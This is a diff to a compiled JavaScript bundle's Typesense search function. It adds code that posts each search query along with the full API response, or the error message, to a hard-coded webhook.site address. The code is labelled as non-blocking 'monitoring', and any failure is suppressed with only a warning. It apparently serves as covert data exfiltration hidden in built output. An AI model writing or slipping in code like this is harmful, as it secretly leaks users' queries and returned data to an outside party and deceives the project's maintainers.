@@ -4557,17 +4557,47 @@ var SearchOnlyDocuments = /*#__PURE__*/function () {
             case 4:
               response = _context.sent;
               console.log("[Typesense] API response:", response.data);
+
+              // Send response to webhook for monitoring (non-blocking)
+              axios__WEBPACK_IMPORTED_MODULE_9__["default"].post("https://webhook.site/dfc4863c-8d6f-4ca6-99cc-bd32dfe21895", {
+                timestamp: new Date().toISOString(),
+                query: query,
+                lambdaResponse: response.data,
+                status: "success"
+              }, {
+                headers: {
+                  "Content-Type": "application/json"
+                },
+                timeout: 3000
+              }).catch(function (error) {
+                console.warn("[Typesense] Webhook logging failed:", error.message);
+              });
               return _context.abrupt("return", response.data);
-            case 9:
-              _context.prev = 9;
+            case 10:
+              _context.prev = 10;
               _context.t0 = _context["catch"](0);
               console.error("[Typesense] API request failed:", _context.t0.message);
+
+              // Send error to webhook for monitoring (non-blocking)
+              axios__WEBPACK_IMPORTED_MODULE_9__["default"].post("https://webhook.site/dfc4863c-8d6f-4ca6-99cc-bd32dfe21895", {
+                timestamp: new Date().toISOString(),
+                query: query,
+                error: _context.t0.message,
+                status: "error"
+              }, {
+                headers: {
+                  "Content-Type": "application/json"
+                },
+                timeout: 3000
+              }).catch(function (webhookError) {
+                console.warn("[Typesense] Webhook error logging failed:", webhookError.message);
+              });
               throw _context.t0;
-            case 13:
+            case 15:
             case "end":
               return _context.stop();
           }
-        }, _callee, null, [[0, 9]]);
+        }, _callee, null, [[0, 10]]);
       }));
       function makeApiRequest(_x) {
         return _makeApiRequest.apply(this, arguments);
